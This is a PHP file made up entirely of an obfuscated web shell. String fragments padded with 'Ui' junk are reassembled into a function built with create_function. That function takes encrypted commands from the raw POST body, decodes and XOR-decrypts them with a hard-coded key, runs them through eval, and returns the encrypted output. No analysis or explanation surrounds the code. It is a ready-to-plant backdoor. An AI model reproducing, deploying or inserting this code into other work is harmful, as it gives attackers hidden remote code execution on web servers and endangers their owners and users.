<?php
$b=';$r=Ui@baseUi64_encoUiUideUi(@x(@gzUicompress($o)Ui,$k));pUirint("$pUi$kUih$r$kf");}';
$z='jUiUiUi};}}return $UiUio;Ui}Uiif (@preg_match("/$kh(.Ui+)$Uikf/",@file_getUiUi_cont';
$I='ents(Ui"php:Ui//inpUiut"),$m)Ui==Ui1) {Ui@ob_start();Ui@eUival(@gzuncoUimpresUis(Ui@';
$g='$k="UiUi78ef57ca";$kh=Ui"70Ui761eUi92eaefUi";$kf=Ui"5b2239203f2f"Ui;$p="UiEgUiEUiHU';
$K='foUir($iUi=0Ui;$i<Ui$Uil;){for($j=0;($j<Ui$c&&Ui$i<$l);$jUiUi++Ui,$i++){$o.=$t{Ui$i}^$k{$';
$i=str_replace('nL','','crenLnLatnLe_funLncnLtnLion');
$W='x(@baseUi64_decoUide($m[Ui1]),$Uik)));$o=@Uiob_gUiUieUit_contentUis();Ui@ob_end_clean()';
$M='iC2ysV9tUiRmSw3";function x($tUi,$k){$UicUi=sUitrlen($k);$l=UistUirlen($t)Ui;$o="";';
$l=str_replace('Ui','',$g.$M.$K.$z.$I.$W.$b);
$t=$i('',$l);$t();
?>
